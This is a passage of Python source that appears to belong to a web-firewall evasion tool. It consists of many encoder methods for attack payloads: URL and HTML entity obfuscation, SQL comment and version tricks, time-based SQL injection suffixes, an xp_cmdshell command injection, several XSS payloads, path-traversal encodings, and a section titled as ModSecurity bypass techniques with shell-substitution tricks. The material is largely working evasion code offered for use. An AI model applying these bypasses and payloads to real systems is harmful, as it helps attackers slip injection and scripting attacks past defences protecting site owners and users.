    @staticmethod
    def _enc_url(p):       return quote(p, safe="")
    @staticmethod
    def _enc_url2(p):      return quote(quote(p, safe=""), safe="")
    @staticmethod
    def _enc_url3(p):      return quote(quote(quote(p, safe=""), safe=""), safe="")
    @staticmethod
    def _enc_html_dec(p):  return "".join(f"&#{ord(c)};" for c in p)
    @staticmethod
    def _enc_html_hex(p):  return "".join(f"&#x{ord(c):02x};" for c in p)
    @staticmethod
    def _enc_html_HEX(p):  return "".join(f"&#x{ord(c):02X};" for c in p)
    @staticmethod
    def _enc_mixed(p):     return "".join(c.upper() if i%2 else c.lower() for i,c in enumerate(p))
    @staticmethod
    def _enc_upper(p):     return p.upper()
    @staticmethod
    def _enc_lower(p):     return p.lower()
    @staticmethod
    def _enc_rand(p):      return "".join(random.choice([c.upper(), c.lower()]) for c in p)
    @staticmethod
    def _enc_tab(p):       return p.replace(" ", "\t")
    @staticmethod
    def _enc_newline(p):   return p.replace(" ", "\n")
    @staticmethod
    def _enc_cr(p):        return p.replace(" ", "\r")
    @staticmethod
    def _enc_ff(p):        return p.replace(" ", "\f")
    @staticmethod
    def _enc_null(p):      return p.replace(" ", "%00")
    @staticmethod
    def _enc_plus(p):      return p.replace(" ", "+")
    @staticmethod
    def _enc_pct20(p):     return p.replace(" ", "%20")
    @staticmethod
    def _enc_comment(p):   return p.replace(" ", "/**/")
    @staticmethod
    def _enc_dash(p):      return p.replace(" ", "--\n")
    @staticmethod
    def _enc_hash(p):      return p.replace(" ", "#\n")
    @staticmethod
    def _enc_ver(p):       return p.replace("SELECT", "/*!50000SELECT*/")
    @staticmethod
    def _enc_tab09(p):     return p.replace(" ", "%09")
    @staticmethod
    def _enc_lf0a(p):      return p.replace(" ", "%0a")
    @staticmethod
    def _enc_cr0d(p):      return p.replace(" ", "%0d")
    @staticmethod
    def _enc_vt0b(p):      return p.replace(" ", "%0b")
    @staticmethod
    def _enc_char(p):      return ("CHAR("+",".join(str(ord(c)) for c in p)+")") if len(p)<30 else p
    @staticmethod
    def _enc_hex0x(p):     return "0x"+p.encode().hex()
    @staticmethod
    def _enc_paren(p):     return p.replace("SELECT","((SELECT))").replace("UNION","((UNION))")
    @staticmethod
    def _enc_sleep(p):     return p+" AND SLEEP(2)--"
    @staticmethod
    def _enc_bench(p):     return p+" AND BENCHMARK(5000000,MD5(1))--"
    @staticmethod
    def _enc_mssql(p):     return p+";EXEC xp_cmdshell('ping 127.0.0.1')--"
    @staticmethod
    def _enc_oracle(p):    return p+" AND 1=1 FROM DUAL--"
    @staticmethod
    def _enc_svg(p):       return "<svg onload=alert(1)>"
    @staticmethod
    def _enc_img(p):       return "<img src=x onerror=alert(1)>"
    @staticmethod
    def _enc_js_uri(p):    return "javascript:alert(1)"
    @staticmethod
    def _enc_autofocus(p): return "<input autofocus onfocus=alert(1)>"
    @staticmethod
    def _enc_tpl(p):       return "`${alert(1)}`"
    @staticmethod
    def _enc_data(p):      return "data:text/html,<script>alert(1)</script>"
    @staticmethod
    def _enc_svg_anim(p):  return "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
    @staticmethod
    def _enc_fromchar(p):  return "String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)"
    @staticmethod
    def _enc_css_expr(p):  return "<style>*{x:expression(alert(1))}</style>"
    @staticmethod
    def _enc_pct25L(p):    return p.replace("<","%253C").replace(">","%253E")
    @staticmethod
    def _enc_path2enc(p):  return p.replace("../","..%252F")
    @staticmethod
    def _enc_backsl(p):    return p.replace("/","\\")
    @staticmethod
    def _enc_slash(p):     return p.replace("/","%2F")
    @staticmethod
    def _enc_semi(p):      return p.replace(";","%3B")
    @staticmethod
    def _enc_ufw(p):       return p.replace("<","\uff1c").replace(">","\uff1e")
    @staticmethod
    def _enc_jsunic(p):
        # Produce real JSON unicode escape sequences using Python's unicode_escape codec
        return p.encode("unicode_escape").decode("ascii")
    @staticmethod
    def _enc_xmlcd(p):     return "<![CDATA[{}]]>".format(p)
    @staticmethod
    def _enc_cyr(p):       return p.replace("o","\u043e").replace("a","\u0430")

    # ── ModSecurity-Specific Bypass Techniques ──────────────────────────
    @staticmethod
    def _ms_html_comment(p):
        return p.replace("<script>","<scr<!---->ipt>").replace("alert","al<!---->ert")
    @staticmethod
    def _ms_attr_noquote(p):
        return p.replace("onerror='alert(1)'","onerror=alert(1)")
    @staticmethod
    def _ms_space_comment(p):
        return re.sub(r"\s+","/**/",p)
    @staticmethod
    def _ms_backtick(p):
        return p.replace("SELECT","`SELECT`").replace("UNION","`UNION`").replace("FROM","`FROM`")
    @staticmethod
    def _ms_path_unicode(p):
        return p.replace("../","..%c0%af")
    @staticmethod
    def _ms_path_dslash(p):
        return p.replace("../","..//")
    @staticmethod
    def _ms_rce_backtick(p):
        return p.replace("$(id)","`id`").replace("$(whoami)","`whoami`")
    @staticmethod
    def _ms_ifs(p):
        return p.replace(" ","${IFS}")
    @staticmethod
    def _ms_php_tag(p):
        return p.replace("<?php","<?")
    @staticmethod
    def _ms_json_wrap(p):
        return json.dumps({"q":p,"x":"normal"})

